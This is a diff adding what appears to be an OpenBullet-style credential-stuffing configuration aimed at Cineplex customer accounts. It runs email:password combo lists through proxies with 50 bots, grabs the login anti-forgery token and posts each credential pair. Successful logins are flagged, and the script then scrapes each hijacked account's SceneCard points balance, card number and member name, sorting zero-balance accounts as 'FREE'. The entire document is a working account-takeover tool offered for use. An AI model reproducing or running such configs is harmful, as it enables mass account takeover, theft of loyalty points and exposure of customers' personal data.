@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Cineplex",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-10T22:30:11.6294459+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://connect.cineplex.com/Account/Authorization/Login?ParentPage=https%3A%2F%2Fwww.cineplex.com%2F" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "requestVerificationToken = '" "'" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://connect.cineplex.com/Account/Authorization/LoginUser" AutoRedirect=TRUE 
+  CONTENT "{\"Source\":1,\"KeepMeLoggedIn\":false,\"CineplexEmailAddress\":\"<USER>\",\"CineplexPassword\":\"<PASS>\",\"Facebook\":{\"FacebookUserId\":null},\"Twitter\":{\"TwitterScreenName\":null,\"TwitterToken\":null,\"TwitterTokenSecret\":null,\"ProfileImageUrl\":null},\"MicrosoftAccount\":{\"MicrosoftAccountUserId\":null},\"GooglePlus\":{\"GooglePlusUserId\":null,\"ProfileImageUrl\":null}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "RequestVerificationToken: <TOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "\"Token" 
+  KEYCHAIN Success OR 
+    KEY "\"Token" 
+REQUEST GET "https://connect.cineplex.com/Account/SceneCards/Manage?ParentPage=https%3A%2F%2Fwww.cineplex.com%2Fconnect" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "PointsBalanceString\":\"" "\"" Recursive=FALSE -> CAP "POINTS" "" "" 
+PARSE "<SOURCE>" LR "CardNumber\":\"" "\"" Recursive=FALSE -> CAP "CARDNUMBER" "" "" 
+PARSE "<SOURCE>" LR "CardMemberName\":\"" "\"" Recursive=FALSE -> CAP "NAME" "" "" 
+PARSE "<SOURCE>" LR "PointsBalanceString\":\"" "\"" Recursive=FALSE -> VAR "FILTER" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<FILTER>" EqualTo "0" 
+    KEY "<FILTER>" EqualTo "" 
